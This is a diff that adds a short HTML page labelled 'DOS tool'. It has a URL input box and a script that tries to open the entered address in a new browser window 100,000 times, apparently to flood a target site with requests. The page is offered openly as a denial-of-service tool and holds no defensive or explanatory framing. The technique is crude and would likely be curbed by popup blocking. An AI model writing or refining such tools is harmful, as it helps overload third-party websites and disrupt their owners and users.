@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>DOS-tool</title>
+</head>
+<body>
+    <h2>DOS tool by/M:p</h2>
+    <form>
+        <label for="urlInput">Enter URL:</label>
+        <input type="text" id="urlInput" name="urlInput">
+        <button onclick="openSite()">Go</button>
+    </form>
+
+    <script>
+        function openSite() {
+            var url = document.getElementById('urlInput').value;
+            for (var i = 0; i < 100000; i++) {
+                window.open(url);
+            }
+        }
+    </script>
+</body>
+</html>
